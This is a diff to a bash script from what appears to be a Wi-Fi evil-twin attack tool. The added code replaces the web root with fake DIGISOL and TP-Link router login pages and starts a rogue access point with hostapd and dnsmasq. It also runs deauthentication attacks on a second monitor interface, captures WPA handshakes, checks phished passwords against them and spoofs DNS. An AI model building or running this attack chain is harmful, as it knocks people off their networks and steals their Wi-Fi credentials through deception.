@@ -20,11 +20,17 @@ case $APName in
   1)
     APFlag=1
     printf "\n[-] selected AP is: DIGISOL \n"
+    rm /var/www/html/index.*
+    cp APLoginPage/Digisol /var/www/html/index.php
+    cp APLoginPage/stylemain.css /var/www/html/
+    cp APLoginPage/head_logo_p1.jpg /var/www/html/
     ;;
 
   2)
     APFlag=2
     printf "\n[-] selected AP is: TPLINK \n"
+    rm /var/www/html/index.*
+    cp APLoginPage/default_AP /var/www/html/index.php
     ;;
 
   3)
@@ -45,10 +51,15 @@ then
 fi
 done
 
-# running hostapd
+# starting apache server
+printf "[-] starting apache server. . .\n"
+service apache2 start
+
+# configuring and running hostapd
+./python_scripts/configure_hostapd.py 
 printf "[-] creating fake AP. . .\n"
 #xterm -geometry 93x31+100+35  -hold -e "hostapd hostapd.conf" &
-xterm -geometry 93x31+100+35  -hold -e "hostapd conf_files/hostapd.conf" &
+xterm -geometry 85x20+100+35  -hold -e "hostapd conf_files/hostapd.conf" &
 #hostapd hostapd.conf &
 sleep 17
 # assigning ip on the wlan interface
@@ -62,7 +73,7 @@ route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 # configuring DHCP
 printf "[-] starting DHCP server. . .\n"
 #xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C dnsmasq.conf -d" &
-xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C conf_files/dnsmasq.conf -d" &
+xterm -geometry 93x20+100+550  -hold -e "dnsmasq -C conf_files/dnsmasq.conf -d" &
 #dnsmasq -C dnsmasq.conf -d &
 sleep 7
 
@@ -81,12 +92,20 @@ iptables -P FORWARD ACCEPT
 printf "[-] enabling ip forwarding. . .\n"
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
+# starting dauth attack
+xterm -geometry 55x35+0+1  -hold -e "./python_scripts/deauth_attack.py 2" &
+
+# checking for password verfication
+handshakev_file=handshake_cap/handshake-01.cap
+if [[ -f $handshakev_file  ]]
+then
+	xterm -geometry 50x15+1100+0 -hold  -e "./verify_password.sh" &
+fi
 
 printf "[-] spoofing dns. . .\n"
 dnsspoof -i wlan0mon 
-#printf "[-] starting apache2 server. . .\n"
-}
 
+}
 
 #-------------------------------------------------------------------------------------------------------------
 # function for deciding the type of attack
@@ -102,18 +121,19 @@ do
     if [[ $attack_flag == 1 ]]
     then
 	    printf "\n[-] initiating attack for captureing handshake. . . \n"
-	    #./python_scripts/p_sniffer.py
+	    ./python_scripts/p_sniffer.py
 	    no_of_files=$(ls ap_info_json/ -1q | wc -l)
 
 	    if [[ $no_of_files == 1 ]]
             then
 		printf "[-] target_ap.json found!\n"
 		rm handshake-*  > /dev/null 2>&1
-		xterm -geometry 93x31+100+35  -hold -e "./python_scripts/capture_handshake.py" &
-		xterm -geometry 93x31+100+550  -hold -e "./python_scripts/deauth_attack.py 1" &
+		rm handshake_cap/handshake-*  > /dev/null 2>&1
+		xterm -geometry 93x20+100+35  -hold -e "./python_scripts/capture_handshake.py" &
+		xterm -geometry 75x20+100+550  -hold -e "./python_scripts/deauth_attack.py 1" &
 		printf "[-] capturing . ."
 		sleep_timer=0
-		while [ $sleep_timer -lt 16 ]
+		while [ $sleep_timer -lt 12 ]
 		do
    			printf " . ."
    			sleep_timer=`expr $sleep_timer + 1`
@@ -125,10 +145,10 @@ do
 		then
 			printf "\n[-] handshake captured! \n"
 			mv handshake-01* handshake_cap/
+			select_attack
 		else
 			printf "\n[!!] handshake not captured \n" 
 		fi
-		select_attack
             else
 		printf "[-] target.json file wasn't found, can't perform this attack\n"
 	    fi
@@ -180,13 +200,18 @@ else
     printf "[!!ERROR] exiting. . .\n"
     exit
 fi
+
+iw wlan0mon interface add mon7 type monitor
 count=0
 interface=wlan0mon
+interfaceTwo=mon7
+ifconfig $interfaceTwo up
 ifconfig $interface up
 
 while true
 do
     flag=$(cat /sys/class/net/wlan0mon/operstate)
+    flagTwo=$(cat /sys/class/net/mon7/operstate)
     if [[ $flag == "up" ]]
     then
 	printf "[-] $interface is up \n"
@@ -200,7 +225,7 @@ do
 	sleep 5
     elif [[ $flag == "unknown" ]]
     then
-	printf "[-] interface status unknown. . . \n"
+	printf "[-] $interface status unknown. . . \n"
 	break
     fi
     if [[ $count == 5 ]]
@@ -209,7 +234,6 @@ do
 	break
     fi
 done
-
 # if the status is down,
 if [[ $count == 777 ]]
 then
@@ -217,6 +241,24 @@ then
     exit
 fi
 
+# checking the status of second interface
+if [[ $flagTwo == "up" ]]
+then
+	printf "[-] $interfaceTwo is up \n"
+elif [[ $flagTwo == "unknown" ]]
+then
+	printf "[-] $interfaceTwo is unknown \n"
+else
+	printf "[-] $interfaceTwo is down, trying again. . . \n"
+	ifconfig $interfaceTwo up
+    	flagTwo=$(cat /sys/class/net/mon7/operstate)
+	if [[ $flagTwo == "up" || $flagTwo == "unknown" ]]
+	then
+		printf "[-] $interfaceTwo is up \n"
+	else
+		printf "[-] $interfaceTwo is still down, can't perform deauth simultaneously\n"
+	fi
+fi
 #-----------------------------------------------------------------------------------------------------------------
 # MAIN:                                      -----------------------------------------------------------
 #-----------------------------------------------------------------------------------------------------------------
